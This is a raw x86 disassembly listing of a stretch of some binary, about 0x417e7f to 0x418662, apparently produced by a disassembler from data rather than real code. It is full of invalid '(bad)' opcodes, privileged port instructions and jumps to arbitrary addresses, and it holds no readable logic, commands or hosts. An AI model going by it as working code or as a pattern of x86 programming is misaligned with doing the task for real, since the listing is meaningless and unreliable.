  417e7f:	out    dx,al
  417e80:	out    dx,al
  417e81:	rol    edx,cl
  417e83:	or     BYTE PTR [edx+0x6b],cl
  417e86:	loop   0x417e93
  417e88:	cmp    eax,0xa42c6389
  417e8d:	ret    
  417e8e:	repz ret 
  417e90:	mov    ds:0xff91f5ef,eax
  417e95:	imul   eax,DWORD PTR [edx],0xfffffff3
  417e98:	jb     0x417e38
  417e9a:	pushf  
  417e9b:	fidivr WORD PTR [edi+0x6889fcb4]
  417ea1:	add    BYTE PTR [eax-0x60381baa],ch
  417ea7:	mov    ah,0x5c
  417ea9:	das    
  417eaa:	pop    ss
  417eab:	cli    
  417eac:	cmp    eax,0x4caa3954
  417eb1:	(bad)
  417eb5:	or     esp,edx
  417eb7:	add    DWORD PTR [edx+0x3d],edi
  417eba:	dec    edi
  417ebb:	rcr    DWORD PTR [eax-0x38],1
  417ebe:	not    DWORD PTR [edi-0x70fc3c46]
  417ec4:	mov    esi,0xcad1aa71
  417ec9:	cs sbb ebx,esi
  417ecc:	cwde   
  417ecd:	test   DWORD PTR [edx-0xa],ecx
  417ed0:	pop    ss
  417ed1:	mov    bl,0x80
  417ed3:	imul   edx,DWORD PTR [esi-0x672fd32b],0x5cd07f
  417edd:	mov    eax,0x5fccd781
  417ee2:	sbb    eax,DWORD PTR [eax+ebp*2-0x10]
  417ee6:	scas   eax,DWORD PTR es:[edi]
  417ee7:	stc    
  417ee8:	hlt    
  417ee9:	leave  
  417eea:	pusha  
  417eeb:	arpl   WORD PTR [edi+0x27],dx
  417eee:	in     al,dx
  417eef:	repnz mov esp,DWORD PTR [eax]
  417ef2:	les    ecx,FWORD PTR [edx+0x50]
  417ef5:	sahf   
  417ef6:	mov    edi,0x96331349
  417efb:	xor    edi,ecx
  417efd:	and    al,0x24
  417eff:	ror    DWORD PTR [ebx],0x72
  417f02:	mul    ecx
  417f04:	jecxz  0x417f26
  417f06:	in     eax,0x0
  417f08:	fsubr  st,st(4)
  417f0a:	xchg   eax,ebp
  417f0c:	and    ebp,DWORD PTR [eax+0x672642b1]
  417f12:	mov    DWORD PTR [ebp-0x2ee1c41d],ebx
  417f18:	mov    ah,0xed
  417f1a:	out    0xd7,al
  417f1c:	dec    eax
  417f1d:	rcr    BYTE PTR [ecx+0x6997fa72],0x8a
  417f24:	inc    ecx
  417f25:	loopne 0x417f5e
  417f27:	stc    
  417f28:	js     0x417f36
  417f2a:	xchg   ebx,eax
  417f2b:	ins    BYTE PTR es:[edi],dx
  417f2c:	and    al,0x4b
  417f2e:	sub    cl,dl
  417f30:	or     ah,BYTE PTR [ebp+0x61]
  417f33:	retf   0x5000
  417f36:	pop    ebp
  417f37:	pusha  
  417f38:	and    ebp,ebp
  417f3a:	push   cs
  417f3b:	and    bh,BYTE PTR [ecx+0x7c97b1ca]
  417f41:	inc    eax
  417f42:	mov    al,0x1
  417f44:	aas    
  417f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f47:	cwde   
  417f48:	call   0xdf978e92
  417f4d:	addps  xmm2,xmm5
  417f50:	cdq    
  417f51:	add    ch,BYTE PTR [ebp+0x5c4d5d8c]
  417f57:	adc    eax,0xa52f21a7
  417f5c:	ss js  0x417f02
  417f5f:	jae    0x417f6f
  417f61:	dec    edx
  417f62:	std    
  417f63:	jns    0x417fb2
  417f65:	fs xor eax,0x7fea10dc
  417f6b:	in     eax,0x58
  417f6d:	leave  
  417f6e:	xchg   esi,eax
  417f6f:	pop    edx
  417f70:	push   cs
  417f71:	ss ins BYTE PTR es:[edi],dx
  417f73:	cmp    esp,DWORD PTR [eax-0x61941bf]
  417f79:	iret   
  417f7a:	pop    esi
  417f7b:	pop    ecx
  417f7c:	test   al,0x12
  417f7e:	mov    ch,0xc1
  417f80:	imul   edx,DWORD PTR [ecx],0x78
  417f83:	into   
  417f84:	mov    ?,WORD PTR [edi-0x77]
  417f87:	clc    
  417f88:	pop    edx
  417f89:	nop
  417f8a:	dec    edi
  417f8b:	sbb    cl,BYTE PTR ds:0x3a41fce8
  417f91:	lds    esp,FWORD PTR [edi]
  417f93:	shr    BYTE PTR [esi-0x6aa30efc],0x8c
  417f9a:	sbb    eax,0x478e624f
  417f9f:	dec    edx
  417fa0:	call   0x248cfd0e
  417fa5:	shrd   DWORD PTR [esi+0x6e],ecx,0xa6
  417faa:	nop
  417fab:	cli    
  417fac:	mov    ch,al
  417fae:	pop    eax
  417faf:	cmp    ah,cl
  417fb1:	jp     0x417f4f
  417fb3:	push   ebp
  417fb4:	mov    esp,0xcee10115
  417fb9:	(bad)  
  417fba:	inc    DWORD PTR [ebx-0x1a274ce8]
  417fc0:	imul   esp,DWORD PTR [eax-0x4d],0x2cf689cb
  417fc7:	stc    
  417fc8:	dec    ebp
  417fc9:	les    edx,FWORD PTR [ebx-0x45]
  417fcc:	and    esp,DWORD PTR [ebx+edi*4]
  417fcf:	mov    ebx,0x7f97705c
  417fd4:	inc    ebx
  417fd5:	mov    ds:0xab68953d,eax
  417fda:	bound  esp,QWORD PTR [esi]
  417fdc:	sub    DWORD PTR [edx-0x6aabb143],esi
  417fe2:	fdiv   st(0),st
  417fe4:	daa    
  417fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fe6:	inc    edx
  417fe7:	js     0x41803c
  417fe9:	ja     0x417fb0
  417feb:	jne    0x417f8a
  417fed:	je     0x41801b
  417fef:	sbb    bh,dh
  417ff1:	dec    ebx
  417ff2:	mov    ds:0x84716e2,eax
  417ff7:	aaa    
  417ff8:	cmp    bh,dl
  417ffa:	xor    ebx,DWORD PTR [ebp+0x644dd39f]
  418000:	adc    DWORD PTR [ecx-0x3],0xfffffff6
  418004:	jnp    0x417fca
  418006:	mov    edi,edi
  418008:	dec    edx
  418009:	(bad)  
  41800b:	inc    ecx
  41800c:	xchg   edi,eax
  41800d:	cmp    BYTE PTR [ebx+0x7bb4ade2],ch
  418013:	popa   
  418014:	mov    edi,0xbcde1195
  418019:	je     0x418024
  41801b:	(bad)  
  41801c:	mov    cl,0xf9
  41801e:	test   BYTE PTR [ebp+0x56a6c9df],0x6
  418025:	pushf  
  418026:	or     al,0x79
  418028:	and    al,0x9d
  41802a:	sahf   
  41802b:	prefetch (bad)
  41802c:	or     eax,0x10a3a9e8
  418031:	mov    dh,0xfc
  418033:	dec    ebx
  418034:	into   
  418035:	sar    BYTE PTR [esi*1+0x1e862ab5],cl
  41803c:	in     eax,0xa1
  41803e:	repnz int 0x40
  418041:	icebp  
  418042:	(bad)  
  418043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418044:	add    ch,BYTE PTR [eax]
  418046:	daa    
  418047:	cwde   
  418048:	in     al,0xaa
  41804a:	mov    DWORD PTR [edx],edi
  41804c:	inc    edx
  41804d:	cs retf 
  41804f:	jmp    0x443b804
  418054:	(bad)  
  418056:	adc    BYTE PTR [ecx-0x3d],dl
  418059:	inc    edi
  41805a:	pop    esi
  41805b:	push   esi
  41805c:	sahf   
  41805d:	push   ds
  41805e:	pop    edx
  41805f:	jp     0x4180b5
  418061:	sbb    eax,0x4ef2e99a
  418066:	jmp    0x418004
  418068:	mov    esp,0x4d52f78
  41806d:	pop    esi
  41806e:	es jmp 0x45bf4734
  418074:	or     eax,0xd8a99e34
  418079:	es popf 
  41807b:	test   BYTE PTR [edi-0x65],ch
  41807e:	aam    0xf7
  418080:	shl    BYTE PTR ds:0xda0a075b,0xbc
  418087:	jge    0x4180ab
  418089:	call   FWORD PTR [eax+ebp*2]
  41808c:	add    edx,ebx
  41808e:	iret   
  41808f:	enter  0x3248,0x5a
  418093:	test   DWORD PTR [eax+0x65867a68],eax
  418099:	fdiv   DWORD PTR [ebp+0x412ce1e0]
  41809f:	pop    ebx
  4180a0:	daa    
  4180a1:	adc    esp,DWORD PTR [ebp-0x6e]
  4180a4:	push   ecx
  4180a5:	lods   eax,DWORD PTR ds:[esi]
  4180a6:	ret    
  4180a7:	jnp    0x4180f7
  4180a9:	cmp    eax,0x46abd18e
  4180ae:	mov    edx,0x18b0c1f3
  4180b3:	mov    dh,BYTE PTR [esi]
  4180b5:	pushf  
  4180b6:	out    dx,al
  4180b7:	pop    esp
  4180b8:	hlt    
  4180b9:	rcl    cl,0x5a
  4180bc:	das    
  4180bd:	fmul   DWORD PTR [edx+0x1e5829b9]
  4180c3:	ficom  DWORD PTR [edx+0x2f951cc6]
  4180c9:	inc    edx
  4180ca:	jmp    0x76f0:0xb837aee
  4180d1:	test   eax,0xf8e5d029
  4180d6:	repnz sub eax,0xfd31f561
  4180dc:	clc    
  4180dd:	ficomp DWORD PTR [eax+ebp*2]
  4180e0:	adc    dl,cl
  4180e2:	inc    edi
  4180e3:	aaa    
  4180e4:	arpl   sp,bp
  4180e6:	mov    dh,0x96
  4180e8:	push   es
  4180e9:	daa    
  4180ea:	dec    edi
  4180eb:	test   DWORD PTR [esi-0x20b9524c],eax
  4180f1:	dec    eax
  4180f2:	sbb    ebp,DWORD PTR [edi-0x4a017bde]
  4180f8:	mov    al,0x31
  4180fa:	cdq    
  4180fb:	cmp    al,0xf7
  4180fd:	jmp    0x700a:0x4e802186
  418104:	mov    bh,0x5
  418106:	imul   BYTE PTR [ecx+0x74]
  418109:	or     al,0x52
  41810b:	mov    esp,0x12675ceb
  418110:	xchg   BYTE PTR [ebx],bl
  418112:	(bad)  [ebx-0x18385bad]
  418118:	inc    BYTE PTR ss:[ebx]
  41811b:	pusha  
  41811c:	test   BYTE PTR [eax-0x2e7010ed],0xc3
  418123:	ins    DWORD PTR es:[edi],dx
  418124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418125:	hlt    
  418126:	ror    BYTE PTR [ebp+0x7a],0x3e
  41812a:	push   0xffffffcc
  41812c:	inc    esi
  41812d:	xchg   ecx,eax
  41812e:	imul   esi,DWORD PTR ds:0x11a1dfd4,0xffffffa1
  418135:	retf   
  418136:	mov    ecx,0x45b7c70b
  41813b:	arpl   WORD PTR [ecx+edi*2-0xc],cx
  41813f:	jbe    0x418136
  418141:	pusha  
  418142:	mov    edi,0xd1ad254b
  418147:	xchg   esp,eax
  418148:	mov    cl,0x4c
  41814a:	test   BYTE PTR ds:0x2a35b33d,ch
  418150:	pop    ss
  418151:	jg     0x41813d
  418153:	dec    esp
  418154:	dec    esp
  418155:	out    dx,al
  418156:	rcl    DWORD PTR [eax-0x44],cl
  418159:	shl    BYTE PTR ds:0x94778326,1
  41815f:	sub    al,0xa3
  418161:	(bad)  
  418162:	cdq    
  418163:	rcr    BYTE PTR [ebx+0x53be8456],0x4c
  41816a:	in     eax,0x5d
  41816c:	or     esp,DWORD PTR [ebp-0x63]
  41816f:	jno    0x4181d6
  418171:	pop    edx
  418172:	retf   
  418173:	xchg   ebx,eax
  418174:	add    bl,al
  418176:	shr    DWORD PTR [esi],cl
  418178:	in     al,0x40
  41817a:	(bad)  
  41817b:	repz jle 0x4181a4
  41817e:	fcomp  st(0)
  418180:	ins    BYTE PTR es:[edi],dx
  418181:	push   0x16cc8116
  418186:	in     eax,dx
  418187:	jno    0x418177
  418189:	push   ecx
  41818a:	ret    
  41818b:	cli    
  41818c:	inc    esi
  41818d:	pop    ebx
  41818e:	test   al,0xe7
  418190:	fdivr  DWORD PTR [eax]
  418192:	mov    dl,0x89
  418194:	stc    
  418195:	cmp    ax,0xbc73
  418199:	pop    ds
  41819a:	pusha  
  41819b:	cmp    DWORD PTR [esi+0x7b],edx
  41819e:	xor    BYTE PTR [ebx-0x57defa3d],bl
  4181a4:	push   cs
  4181a5:	add    BYTE PTR [esi],0x69
  4181a8:	dec    edi
  4181a9:	xchg   BYTE PTR [esp+eiz*4-0x9],al
  4181ad:	dec    esi
  4181ae:	stos   DWORD PTR es:[edi],eax
  4181af:	fcmove st,st(1)
  4181b1:	shl    DWORD PTR [esi-0x22fe5846],cl
  4181b7:	pop    esi
  4181b8:	outs   dx,DWORD PTR ds:[esi]
  4181b9:	in     eax,dx
  4181ba:	mov    esp,0xae598515
  4181bf:	jmp    0x418184
  4181c1:	pop    ebx
  4181c2:	nop
  4181c3:	fcomp  QWORD PTR [ebx]
  4181c5:	leave  
  4181c6:	jl     0x41822c
  4181c8:	pop    esi
  4181c9:	cmp    BYTE PTR [ebx-0x10ffd4be],dl
  4181cf:	mov    edi,0x2261d9a2
  4181d4:	jno    0x418243
  4181d6:	cmp    eax,0x6c6bb6c7
  4181db:	or     DWORD PTR [edi-0xb0299ee],0x8fc68467
  4181e5:	mov    ebp,0x14552a4b
  4181ea:	push   ss
  4181eb:	mov    ?,WORD PTR ds:0xea615ffc
  4181f1:	and    al,0x20
  4181f3:	xchg   DWORD PTR [ebp-0x6c7a28bb],eax
  4181f9:	and    ah,BYTE PTR [edx]
  4181fb:	scas   eax,DWORD PTR es:[edi]
  4181fc:	or     DWORD PTR [edx-0x10],ecx
  4181ff:	and    edi,ebx
  418201:	icebp  
  418202:	stc    
  418203:	mov    bl,0x81
  418205:	mov    bl,0xc
  418207:	not    BYTE PTR [edx-0x62e19f8a]
  41820d:	jae    0x41822c
  41820f:	cdq    
  418210:	and    ebp,DWORD PTR [ebx+edi*2]
  418213:	inc    esi
  418214:	sub    DWORD PTR [esi+esi*4],0xd8535efd
  41821b:	sub    ebx,DWORD PTR [edx+0x4a21b607]
  418221:	ins    BYTE PTR es:[edi],dx
  418222:	leave  
  418223:	and    eax,0xf40b36bd
  418228:	mov    eax,ds:0x5297e6db
  41822d:	cmp    bl,BYTE PTR [edi+0x36b8347]
  418233:	call   0x1a2b:0x7369d2ea
  41823a:	adc    DWORD PTR [edx],esp
  41823c:	sub    ch,BYTE PTR [ecx]
  41823e:	mov    gs,WORD PTR [ebp-0x7a69122a]
  418244:	jbe    0x4182b6
  418246:	pushf  
  418247:	fdiv   QWORD PTR [eax+0x43]
  41824a:	and    DWORD PTR [eax-0x5f57bf9b],0x8
  418251:	jmp    0xba16ef08
  418256:	push   ebp
  418257:	xchg   BYTE PTR [edi-0x3d1c4104],bl
  41825d:	sub    al,dh
  41825f:	add    ecx,edi
  418261:	cmp    al,0xb0
  418263:	mov    al,0x28
  418265:	xor    DWORD PTR [ebx-0x135fa3a9],esi
  41826b:	sar    esp,cl
  41826d:	(bad)  
  41826e:	out    0xc0,eax
  418270:	ds out dx,al
  418272:	lods   al,BYTE PTR gs:[esi]
  418274:	sub    al,0x9a
  418276:	push   0x577f239e
  41827b:	adc    BYTE PTR [ecx-0x6c8f58b8],0xac
  418282:	imul   edi,DWORD PTR [edx+0x1d],0xfba643a6
  418289:	cmc    
  41828a:	sub    al,0x20
  41828c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41828d:	icebp  
  41828e:	adc    ebx,0x17
  418291:	leave  
  418292:	pop    ds
  418293:	adc    dh,BYTE PTR [edi+ecx*2+0x3fbba9f8]
  41829a:	(bad)  
  41829b:	fsub   DWORD PTR [esi-0x636ca66d]
  4182a1:	or     bl,BYTE PTR [edx-0x766a4e84]
  4182a7:	push   ss
  4182a8:	leave  
  4182a9:	fsub   DWORD PTR [ecx+eax*1]
  4182ac:	xor    esi,DWORD PTR [eax+0x4d]
  4182af:	push   ecx
  4182b0:	je     0x418256
  4182b2:	pop    ebx
  4182b3:	(bad)  
  4182b4:	(bad)  
  4182b5:	out    dx,eax
  4182b6:	daa    
  4182b7:	fdiv   st(4),st
  4182b9:	and    cl,BYTE PTR [eax]
  4182bb:	test   al,0x73
  4182bd:	sti    
  4182be:	lds    esp,FWORD PTR [ebp+0x51]
  4182c1:	loop   0x418331
  4182c3:	inc    eax
  4182c4:	imul   esp,DWORD PTR [eax],0x6f
  4182c7:	repnz mov ebp,0xad62f275
  4182cd:	mov    eax,0x82b137f3
  4182d2:	cwde   
  4182d3:	pop    ecx
  4182d4:	sbb    edx,0x44aaf154
  4182da:	es pop edi
  4182dc:	sbb    al,0xa9
  4182de:	iret   
  4182df:	enter  0xffd3,0xfe
  4182e3:	jo     0x4182e5
  4182e5:	lea    ebx,[esi-0x68976ae4]
  4182eb:	test   BYTE PTR [esi+0x5b],al
  4182ee:	lahf   
  4182ef:	add    DWORD PTR [ebp-0x6a],ebp
  4182f2:	popf   
  4182f3:	scas   al,BYTE PTR es:[edi]
  4182f4:	lods   al,BYTE PTR ds:[esi]
  4182f5:	arpl   WORD PTR ds:0xe34945e1,ax
  4182fb:	outs   dx,DWORD PTR ds:[esi]
  4182fc:	and    BYTE PTR [esi],ah
  4182fe:	mov    ebp,edi
  418300:	add    al,0xb2
  418302:	inc    ebx
  418303:	jg     0x418311
  418305:	shl    BYTE PTR [ecx],cl
  418307:	jne    0x4182fe
  418309:	hlt    
  41830a:	push   cs
  41830b:	xchg   edx,eax
  41830c:	sbb    DWORD PTR [ecx-0x5e8a8143],esp
  418312:	push   es
  418313:	sub    DWORD PTR [eax-0x6d6a4664],0x8c05a85e
  41831d:	mov    es,WORD PTR [esi-0x2db082d0]
  418323:	and    BYTE PTR [ebx],ch
  418325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418326:	sti    
  418327:	inc    ebx
  418328:	jo     0x418326
  41832a:	mov    bl,0x83
  41832c:	push   cs
  41832d:	push   edi
  41832e:	xchg   ecx,eax
  41832f:	nop
  418330:	push   0xffffffbe
  418332:	aaa    
  418333:	or     al,0xe7
  418335:	and    BYTE PTR [ecx],cl
  418337:	adc    esp,DWORD PTR [eax-0x679c8b2d]
  41833d:	daa    
  41833e:	sub    eax,0xe4547fc6
  418343:	jno    0x418390
  418345:	or     eax,0x93ecadae
  41834a:	pop    esp
  41834b:	fs mov bl,al
  41834e:	pop    ds
  41834f:	xchg   ebx,eax
  418350:	cmp    al,0x0
  418352:	inc    esi
  418353:	ss xchg esp,eax
  418355:	inc    ebp
  418356:	jmp    0x8cd6:0x7c495bc3
  41835d:	xor    DWORD PTR [edi-0x4d],esp
  418360:	sub    ch,ch
  418362:	in     eax,0x38
  418364:	imul   ebp,DWORD PTR [esi],0xa
  418367:	ret    0xfa4f
  41836a:	push   edi
  41836b:	dec    ecx
  41836c:	loope  0x41837e
  41836e:	mov    ebx,0x47805aa9
  418373:	pop    ebp
  418374:	ins    BYTE PTR es:[edi],dx
  418375:	mov    bh,0x7d
  418377:	adc    ebx,DWORD PTR [esi]
  418379:	xor    al,0x8
  41837b:	mov    esp,0x14813616
  418380:	xor    DWORD PTR [eax+0x17a5a4ac],ebx
  418386:	mov    ecx,0x7f70595d
  41838b:	fiadd  DWORD PTR [ecx-0x7619173b]
  418391:	push   ss
  418392:	repnz pop edi
  418394:	inc    edi
  418395:	rol    DWORD PTR ds:0x6dad06bf,0xf4
  41839c:	sar    BYTE PTR [esi],1
  41839e:	inc    esi
  41839f:	fucom  st(7)
  4183a1:	inc    esi
  4183a2:	pop    ebx
  4183a3:	cld    
  4183a4:	xor    DWORD PTR [ecx],0xd64179
  4183aa:	or     dh,BYTE PTR [edi-0x2]
  4183ad:	sbb    dl,ch
  4183af:	scas   eax,DWORD PTR es:[edi]
  4183b0:	out    0x6d,al
  4183b2:	adc    eax,0xd75ef870
  4183b7:	jbe    0x418415
  4183b9:	cmc    
  4183ba:	cld    
  4183bb:	iret   
  4183bc:	dec    ebp
  4183bd:	loope  0x4183fe
  4183bf:	stos   DWORD PTR es:[edi],eax
  4183c0:	popa   
  4183c1:	scas   eax,DWORD PTR es:[edi]
  4183c2:	push   ebx
  4183c3:	inc    edx
  4183c4:	cmc    
  4183c5:	iret   
  4183c6:	das    
  4183c7:	ret    0x5104
  4183ca:	jle    0x4183a5
  4183cc:	pusha  
  4183cd:	mov    ebx,DWORD PTR [ecx]
  4183cf:	iret   
  4183d0:	test   DWORD PTR [edi+edi*8+0x68341ad4],ebx
  4183d7:	xor    ebx,DWORD PTR [ebx-0x15]
  4183da:	dec    ecx
  4183db:	xchg   ebx,eax
  4183dc:	dec    ebx
  4183dd:	stos   DWORD PTR es:[edi],eax
  4183de:	mov    dl,0x95
  4183e0:	lahf   
  4183e1:	out    dx,eax
  4183e2:	cwde   
  4183e3:	inc    ebp
  4183e4:	cmp    bh,al
  4183e6:	jbe    0x418457
  4183e8:	popa   
  4183e9:	xchg   esp,eax
  4183ea:	dec    edi
  4183eb:	and    DWORD PTR [edi+0x1e],0xf0fc2957
  4183f2:	sbb    al,0x95
  4183f4:	pushf  
  4183f5:	ret    0x2634
  4183f8:	xor    bl,BYTE PTR [ebx+0x1f2fa07b]
  4183fe:	mov    edi,0xcac9a092
  418403:	test   BYTE PTR [edi+0x6f1b9167],ch
  418409:	jmp    0x4183a5
  41840b:	push   ebp
  41840c:	ss pop ebx
  41840e:	jns    0x418482
  418410:	imul   eax,DWORD PTR [esi-0x28],0xffffffea
  418414:	or     eax,0xadc25531
  418419:	or     al,0x8f
  41841b:	mov    DWORD PTR [ebp+0x28],eax
  41841e:	mov    esp,0x326295c7
  418423:	pusha  
  418424:	addr16 xchg ecx,eax
  418426:	inc    edx
  418427:	mov    ecx,0x4d4ca504
  41842c:	das    
  41842d:	push   edi
  41842e:	mov    eax,0x5dae8e56
  418433:	leave  
  418434:	stos   DWORD PTR es:[edi],eax
  418435:	mov    edx,0xc800bfa5
  41843a:	(bad)  
  41843b:	shl    DWORD PTR [edi],cl
  41843d:	mov    ds:0x2cebf630,al
  418442:	into   
  418443:	mov    ecx,0xa4a81732
  418448:	mov    WORD PTR cs:[esi+0x73],gs
  41844c:	pop    ebp
  41844d:	int3   
  41844e:	mov    al,ds:0xe56dfaee
  418453:	sbb    BYTE PTR [esi],0x6f
  418456:	dec    eax
  418457:	pop    esp
  418458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418459:	push   edi
  41845a:	es (bad) 
  41845c:	arpl   cx,bx
  41845e:	push   0xadde6cac
  418463:	sar    BYTE PTR ds:0x98b53702,cl
  418469:	pop    es
  41846a:	imul   eax,DWORD PTR [edi],0xb7782ee1
  418470:	add    eax,0x6e663263
  418475:	bound  esi,QWORD PTR [ebx-0x7cebf789]
  41847b:	mov    edx,DWORD PTR [edi+ebp*4-0x56]
  41847f:	sub    ah,al
  418481:	cmp    eax,0x835d8d1
  418486:	adc    cl,BYTE PTR [ebx+0x342237f5]
  41848c:	cwde   
  41848d:	in     eax,0xcb
  41848f:	pushf  
  418490:	and    al,0xcf
  418492:	cmp    ebp,edi
  418494:	push   ds
  418495:	arpl   WORD PTR [ebp+0x6f42b114],bx
  41849b:	loope  0x41843b
  41849d:	scas   al,BYTE PTR es:[edi]
  41849e:	jl     0x418505
  4184a0:	inc    esp
  4184a1:	xchg   esp,eax
  4184a2:	mov    ch,0xe0
  4184a4:	xchg   DWORD PTR [ecx-0x4df520ed],ebp
  4184aa:	pop    ss
  4184ab:	(bad)  
  4184ac:	popf   
  4184ad:	pop    ebp
  4184ae:	mov    bl,0x8c
  4184b0:	cs push ecx
  4184b2:	cs xchg ebp,eax
  4184b4:	fldcw  WORD PTR [edi+0x74]
  4184b7:	movq   mm6,QWORD PTR [edx]
  4184ba:	outs   dx,DWORD PTR ds:[esi]
  4184bb:	ins    BYTE PTR es:[edi],dx
  4184bc:	dec    ebx
  4184bd:	pop    esp
  4184be:	cmp    DWORD PTR [esi],ebp
  4184c0:	nop
  4184c1:	loope  0x418461
  4184c3:	aad    0x2b
  4184c5:	or     ecx,DWORD PTR [edi+eax*2+0x54]
  4184c9:	or     edx,DWORD PTR [edx]
  4184cb:	jp     0x41852b
  4184cd:	push   edx
  4184ce:	test   BYTE PTR [esi-0x21],0xf6
  4184d2:	int3   
  4184d3:	idiv   BYTE PTR [edi-0x27985953]
  4184d9:	xchg   ebp,eax
  4184da:	jb     0x41852c
  4184dc:	dec    eax
  4184dd:	lea    ecx,[eax-0xd356ca4]
  4184e3:	sar    BYTE PTR [ecx-0x57db656b],0x96
  4184ea:	push   eax
  4184eb:	jmp    0x5abd:0x68b452f5
  4184f2:	inc    ecx
  4184f3:	xchg   edx,eax
  4184f4:	mov    edi,0x2ae13b6f
  4184f9:	stc    
  4184fa:	xchg   BYTE PTR [ecx+0x3bc1aae1],bh
  418500:	push   0x140d028
  418505:	mov    ds:0x1664787d,al
  41850a:	into   
  41850b:	sub    bl,bl
  41850d:	inc    ebx
  41850e:	pop    eax
  41850f:	fiadd  WORD PTR [edx]
  418511:	aad    0xcf
  418513:	cdq    
  418514:	jne    0x4184dd
  418516:	(bad)  
  418517:	stc    
  418518:	sete   BYTE PTR [edx]
  41851b:	cld    
  41851c:	int    0xa0
  41851e:	lock neg BYTE PTR [edi+0x2b]
  418522:	aam    0xd1
  418524:	xor    al,0x13
  418526:	inc    edi
  418527:	mov    BYTE PTR [edi+0x11],bh
  41852a:	push   cs
  41852b:	mov    esp,0x9e75bdeb
  418530:	stos   BYTE PTR es:[edi],al
  418531:	cmp    BYTE PTR [edx+0x3f],ah
  418534:	inc    eax
  418535:	adc    DWORD PTR [eax+eax*4-0x77],esi
  418539:	push   esi
  41853a:	fild   WORD PTR [eax]
  41853c:	popf   
  41853d:	pushf  
  41853e:	stos   BYTE PTR es:[edi],al
  41853f:	std    
  418540:	xchg   esp,eax
  418541:	dec    eax
  418542:	dec    ecx
  418543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418544:	jo     0x4184dd
  418546:	sub    DWORD PTR [edx+0x7e],ebp
  418549:	or     BYTE PTR [ebp-0x5070a653],bh
  41854f:	xor    ch,dl
  418551:	jnp    0x4184fa
  418553:	xor    al,0x48
  418555:	lea    ecx,[esi]
  418557:	adc    ah,BYTE PTR [ebx]
  418559:	lock dec ebp
  41855b:	mov    al,ds:0x41f41b98
  418560:	mov    esp,DWORD PTR [edx]
  418562:	cli    
  418563:	sbb    BYTE PTR [edx+0x4874f7f6],ah
  418569:	(bad)  
  41856a:	jmp    DWORD PTR [esi-0x36]
  41856d:	gs mov edx,0xb4d7079c
  418573:	loop   0x4185e6
  418575:	ficomp WORD PTR [ebx+0x1674817a]
  41857b:	push   edx
  41857c:	add    esi,ecx
  41857e:	mov    cl,0xd6
  418580:	jmp    0xffc:0x3081b0c4
  418587:	arpl   WORD PTR [ecx-0x59fa5396],ax
  41858d:	addr16 faddp st(2),st
  418590:	sbb    BYTE PTR [eax+0x63],bl
  418593:	xchg   DWORD PTR [ebx-0x600b7ee8],ecx
  418599:	test   al,0xaa
  41859b:	int3   
  41859c:	out    0x74,eax
  41859e:	aam    0x2f
  4185a0:	(bad)  
  4185a3:	addr16 popf 
  4185a5:	ds stc 
  4185a7:	repnz icebp 
  4185a9:	into   
  4185aa:	mov    al,ds:0xc977a1b3
  4185b0:	push   edx
  4185b1:	xchg   edx,eax
  4185b2:	push   0xffffffcb
  4185b4:	or     BYTE PTR [eax-0x3e],dh
  4185b7:	cdq    
  4185b8:	test   BYTE PTR [edx],bl
  4185ba:	js     0x41862f
  4185bc:	scas   eax,DWORD PTR es:[edi]
  4185bd:	adc    ch,BYTE PTR [edx]
  4185bf:	jo     0x418564
  4185c1:	loopne 0x4185c4
  4185c3:	xlat   BYTE PTR ds:[ebx]
  4185c4:	jno    0x41859c
  4185c6:	mov    WORD PTR [eax-0x18],fs
  4185c9:	add    al,0x38
  4185cb:	mov    dh,0x8c
  4185cd:	mov    al,ds:0xb80540da
  4185d2:	(bad)  
  4185d3:	cld    
  4185d4:	mov    edi,DWORD PTR [edx]
  4185d6:	test   al,0x25
  4185d8:	loop   0x41858f
  4185da:	push   cs
  4185db:	inc    ecx
  4185dc:	retf   
  4185dd:	pop    edx
  4185de:	jnp    0x418616
  4185e0:	ds leave 
  4185e2:	addr16 es push es
  4185e5:	dec    ebp
  4185e6:	into   
  4185e7:	jp     0x418571
  4185e9:	xchg   ebx,eax
  4185ea:	lods   al,BYTE PTR ds:[esi]
  4185eb:	cmc    
  4185ec:	mov    ah,0x19
  4185ee:	pusha  
  4185ef:	ins    DWORD PTR es:[edi],dx
  4185f0:	sbb    DWORD PTR [eax+eax*1-0x6f333adb],edx
  4185f7:	add    al,0xc9
  4185f9:	int    0x83
  4185fb:	jp     0x41860a
  4185fd:	adc    al,dh
  4185ff:	xor    edi,DWORD PTR [ebx+0xd4a2d6e]
  418605:	jecxz  0x4185cc
  418607:	imul   esi,DWORD PTR [ecx+0x47],0x75f0612
  41860e:	xchg   esi,eax
  41860f:	xor    dl,BYTE PTR [eax+esi*8-0x1882d545]
  418616:	xor    BYTE PTR [ebp+0x6d],bl
  418619:	call   0x72fe964e
  41861e:	sub    al,0x4b
  418620:	sti    
  418621:	pop    esi
  418622:	add    eax,esi
  418624:	retf   
  418625:	mov    bh,0x39
  418627:	pop    es
  418628:	stc    
  418629:	popa   
  41862a:	mov    esp,0xd9eeda87
  41862f:	stos   BYTE PTR es:[edi],al
  418630:	mov    ebp,DWORD PTR [edi+0x49]
  418633:	je     0x418685
  418635:	push   ss
  418636:	pop    es
  418637:	pop    esi
  418638:	fsubr  DWORD PTR [edx]
  41863a:	ins    BYTE PTR es:[edi],dx
  41863b:	pop    eax
  41863c:	push   es
  41863d:	fs icebp 
  41863f:	sbb    DWORD PTR [ecx+0x597783ed],ebp
  418645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418646:	pop    edi
  418647:	repnz std 
  418649:	mov    BYTE PTR [eax],ch
  41864b:	mov    BYTE PTR [eax+0x68e42e17],al
  418651:	in     al,dx
  418652:	inc    esi
  418653:	dec    esi
  418654:	inc    ebx
  418655:	cmp    ah,dh
  418657:	xor    DWORD PTR [esi],esp
  418659:	daa    
  41865a:	loope  0x4186d5
  41865c:	jno    0x4185e4
  41865e:	js     0x418614
  418660:	arpl   sp,ax
  418662:	outs   dx,BYTE PTR ds:[esi]
